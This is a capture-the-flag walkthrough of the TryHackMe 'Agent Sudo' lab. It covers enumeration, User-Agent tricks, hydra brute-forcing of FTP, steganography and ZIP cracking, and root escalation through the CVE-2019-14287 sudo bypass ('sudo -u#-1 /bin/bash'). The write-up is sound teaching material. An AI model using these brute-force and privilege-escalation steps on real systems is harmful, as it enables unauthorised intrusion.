---
title: 'TryHackMe - Agent Sudo'
author: r2cook
categories: [TryHackMe]
tags: [ftp, hydra, zip_crack, jhon, Steganography, binwalk, steghide, cve-2019-14287, runas-bypass, UID -1, PrivEsc]
render_with_liquid: false
media_subpath: /images/thm/Agent-Sudo/
image:
  path: room_card.png
---

> In this walkthrough, we exploit **TryHackMe: Agent Sudo** by abusing a **User-Agent–based access control mechanism** to discover a valid username, then brute-force FTP credentials to retrieve multiple suspicious files. Through **binwalk extraction, ZIP password cracking, Base64 decoding, and steganography**, we uncover SSH credentials for a valid user account. Finally, we escalate privileges by exploiting a **sudo misconfiguration vulnerable to CVE-2019-14287**, resulting in full root access.

## Initial Setup

Add the target to your hosts file:

```plaintext
10.129.175.41 agent.thm
```
{: file="/etc/hosts" }

---

## Enumeration

### Full Port Scan

```shell
nmap -p- -sV -sC -Pn --min-rate 1000 -oN full_nmap_scan.txt agent.thm
```
{: .nolineno }

### Results

```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.29
```

**Key Findings:**

- FTP (21)
    
- SSH (22)
    
- HTTP (80)
    

---

### Web Enumeration (Directory Fuzzing)

```shell
ffuf -u http://agent.thm/FUZZ \
-w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt \
-e .php,.txt,.bak,.zip,.old,.log \
-mc 200,204,301,302,307,401,403 \
-c | tee ffuf_results.txt
```
{: .nolineno }

### Result

```text
index.php        [200]
server-status    [403]
```

No useful directories discovered.

---

## User-Agent Manipulation

Revisiting the landing page revealed a hint:

![landing page](Image_1.png){: width="800" height="400" .shadow }

The application behavior changes based on the **User-Agent** header.

### Testing Different User-Agents

```shell
curl -A "R" -L http://agent.thm
```
{: .nolineno }

Response:

```html
Use your own <b>codename</b> as user-agent to access the site.
```

Brute-forcing simple agent names:

```shell
curl -A "C" -L http://agent.thm
```
{: .nolineno }

```text
Attention chris,
...
change your password, it is weak!
```

### Key Insight:

- Username discovered: **chris**
    

---

## Brute Force Attack

### Target: FTP

```shell
hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.129.175.41
```
{: .nolineno }

![hydra bruteforce password](Image_2.png){: width="800" height="400" .shadow }


### Credentials Found:

```text
chris:[REDACTED]
```

---

## FTP Enumeration

![ftp login enum](Image_3.png){: width="800" height="400" .shadow }


### Files Retrieved:

- `To_agentJ.txt`
    
- `cute-alien.jpg`
    
- `cutie.png`
    

---

### Inspecting `To_agentJ.txt`

![cat To_agent_J](Image_4.png){: width="800" height="400" .shadow }


> Password is hidden inside a fake image.

---

## Steganography & File Analysis

### Analyze `cutie.png`

```shell
strings cutie.png
```
{: .nolineno }

![strings image](Image_5.png){: width="800" height="400" .shadow }

Found reference:

```
To_agentR.txt
```

---

### Extract Hidden Data

```shell
binwalk cutie.png
```
{: .nolineno }

![binwalk image](Image_6.png){: width="800" height="400" .shadow }


```shell
binwalk -e cutie.png
```
{: .nolineno }

![](Image_7.png){: width="800" height="400" .shadow }


Extracted:

```
_cutie.png.extracted/8702.zip
```

---

### Crack ZIP Password

```shell
zip2john 8702.zip > zip_hash.txt
john zip_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
{: .nolineno }

### Password:

```text
[REDACTED]
```
![cracking zip file](Image_8.png){: width="800" height="400" .shadow }

---

### Extract ZIP

```shell
7z x 8702.zip
```
{: .nolineno }

![7z decompress](Image_9.png){: width="800" height="400" .shadow }

---

### Read Extracted File

```shell
cat To_agentR.txt
```
{: .nolineno }

![cat To_agent_R](Image_10.png){: width="800" height="400" .shadow }

Encoded string:

```text
QXJlYTUx
```

---

### Decode Base64

```shell
echo 'QXJlYTUx' | base64 -d
```
{: .nolineno }

![base64 decode](Image_11.png){: width="800" height="400" .shadow }

### Result:

```text
[REDACTED]
```
Now we have the Passphrase for `cute-alien.jpg`

---

## Steghide Extraction

```shell
steghide extract -sf cute-alien.jpg
```
{: .nolineno }

Extracted file:

```
message.txt
```

![cat message](Image_12.png){: width="800" height="400" .shadow }

---

## SSH Access

### Credentials:

```text
james:[REDACTED]
```

```shell
ssh james@10.129.175.41
```
{: .nolineno }

![ssh login](Image_13.png){: width="800" height="400" .shadow }

---

### User Flag

```text
[REDACTED]
```

![user flag](Image_14.png){: width="800" height="400" .shadow }

---

## Privilege Escalation  (PrivEsc)

### Sudo Permissions

```shell
sudo -l
```
{: .nolineno }

```text
(ALL, !root) /bin/bash
```

---

## Exploiting Sudo Misconfiguration

### Vulnerability — CVE-2019-14287

The sudo version on the target is vulnerable to **CVE-2019-14287**, a well-known **Runas policy bypass vulnerability** affecting versions prior to `1.8.28`.

This issue occurs when the `sudoers` configuration allows a user to run commands as **any user except root**, typically using a rule such as:

```text
(ALL, !root) /bin/bash
```
Although `root` is explicitly blacklisted, the restriction can be bypassed by specifying the numeric `UID -1`, which is interpreted internally as the unsigned value `4294967295`.

Because of how `sudo` handled this special `UID` value, it ultimately resolves to `UID 0` (root), effectively bypassing the `!root` restriction and granting `root` execution.

---

### Exploit

```shell
sudo -u#-1 /bin/bash
```
{: .nolineno }

```shell
id
```
{: .nolineno }

```text
uid=0(root) gid=1000(james)
```

---

## Root Flag

```text
[REDACTED]
```
![PrivEsc - root flag](Image_15.png){: width="800" height="400" .shadow }

---